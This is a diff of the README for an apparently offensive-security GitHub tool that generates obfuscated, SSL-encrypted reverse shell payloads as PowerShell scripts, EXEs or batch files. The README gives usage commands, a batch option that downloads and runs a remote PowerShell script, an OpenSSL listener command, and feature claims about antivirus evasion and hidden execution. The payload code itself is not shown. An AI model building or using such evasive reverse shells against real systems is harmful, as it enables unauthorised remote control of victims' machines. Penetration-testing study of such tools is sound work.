@@ -1,73 +1,60 @@
-# Reverser Tool
+# Reception: Reverse Shell Generator with SSL Encryption
 
-**Reverser** is a Python-based tool designed to generate reverse shell payloads with SSL encryption. The tool provides the ability to create either a PowerShell script (`.ps1`) or an executable file (`.exe`) that establishes a secure reverse shell connection to a specified IP address and port.
+## Overview
+
+**Reverse** is a Python-based tool designed to generate obfuscated PowerShell scripts or batch files for establishing a reverse shell with SSL encryption. This tool can help in penetration testing scenarios where the goal is to bypass security mechanisms and establish a secure connection to a target machine.
 
 ## Features
 
-- **SSL Encryption**: The tool generates an SSL certificate and key to encrypt the reverse shell communication, enhancing security and bypassing basic network security measures.
-- **Payload Generation**: Users can generate either a PowerShell script or an executable file. The payload is obfuscated to avoid detection by antivirus software.
-- **Randomized Obfuscation**: The tool can randomize the obfuscation of the payload to further reduce the chance of detection by static analysis tools.
-- **Hidden Execution**: Both the PowerShell script and the executable are designed to run in a hidden window, minimizing the likelihood of detection by the target user.
-- **Auto-generated Files**: The executable file, when run, generates the PowerShell script on disk, hides it, and executes it to establish the reverse shell connection.
-- **Customizable**: The IP address, port, and output file names can be customized through command-line arguments.
+- **Reverse Shell with SSL Encryption:** Generates PowerShell scripts that establish an encrypted reverse shell connection using SSL.
+- **Obfuscation:** Each generated PowerShell script uses randomly selected variable names to avoid signature-based detection by security tools.
+- **Base64 Encoding:** The PowerShell scripts are encoded in Base64 for additional obfuscation.
+- **Batch File Generation:** Create a batch file that downloads and executes the encoded PowerShell script directly from a remote server.
+- **Customizable:** Users can specify the IP address, port, and server URL for downloading the PowerShell script.
 
-# Installtion
+### Prerequisites
+
+- Python 3.x
+- OpenSSL (for certificate generation)
+
+### Installation
 
 Clone the repository:
-```bash
- git clone https://github.com/ShkudW/Reverser.git
-cd Reverser
-```
-Install the necessary dependencies:
-```bash
-pip install -r requirements.txt
-```
-Ensure Mono is installed:
-```bash
-sudo apt-get install mono-complete
-```
 
+```bash
+git clone https://github.com/ShkudW/Reception.git
+cd Reception
+```
 
 ## Usage
 
-1. **Generating an SSL Certificate**:
-   The tool automatically generates an SSL certificate and key that will be used to encrypt the reverse shell communication.
+Generate an Encoded PowerShell Script:
+```bash
+python3 Reverser.py -ip <Your_Listener_Server_IP> -port <Your_Listener_Server_PORT> -type ps1
+```
 
-2. **Generating a Payload with Obfuscation**:
-   - To generate a PowerShell script:
-     ```bash
-     python3 reverser.py -ip <Your_IP> -port <Your_Port> -type ps1
-     ```
-   - To generate an executable:
-     ```bash
-     python3 reverser.py -ip <Your_IP> -port <Your_Port> -type exe
-     ```
+Generate a Batch File and PowerShell Script:
+```bash
+python3 Reverser.py -ip <Your_Listener_Server_IP> -port <Your_Listener_Server_PORT> -type bat -server http://<Your_Server_ip|URL>/<File-Name>.ps1
+```
 
-3. **Generating a Payload with Random Obfuscationn**:
-   - To enable randomized obfuscation:
-     ```bash
-     python3 reverser.py -ip <Your_IP> -port <Your_Port> -type <exe | ps1> -random
-     ```
+## PoC:
+Generate a Batch File and PowerShell Script:
 
-4. **Starting an SSL Listener**:
-   Once the payload is generated, start an OpenSSL listener on your machine to accept the reverse shell connection:
-   ```bash
-   openssl s_server -accept <Your_Port> -cert reception.pem -key reception.key -quiet
-
-# PoC:
-Creating an obfuscated EXE file that contain a Reverse Shell:
-
-![image](https://github.com/user-attachments/assets/64ff1b49-f1c8-401c-8423-ab851c51c9b9)
+![image](https://github.com/user-attachments/assets/cfa697dc-46dc-4590-a05a-0cb0f09b1f8f)
 
 
-Running the EXE file, creating an encrypted connection:
+Running the BAT file and creating a secure connection to the listener:
 
-![image](https://github.com/user-attachments/assets/1a1bbdc3-b571-4239-a141-04cec47b40ce)
+![image](https://github.com/user-attachments/assets/b7e05932-eeee-424f-905a-cb79481d1e2e)
 
+Getting a Secure Reverse Shell:
 
-Receiving Reverse shell:
+![image](https://github.com/user-attachments/assets/254b55c2-4b83-4792-8901-95504c9a7fba)
 
-![image](https://github.com/user-attachments/assets/640cbfae-fb92-4515-b2bd-7df87bec7cf3)
+Our Web Server with the PS1 file:
+
+![image](https://github.com/user-attachments/assets/9d798ae3-fb11-4354-9ca1-c3c1343a1587)
 
 
 
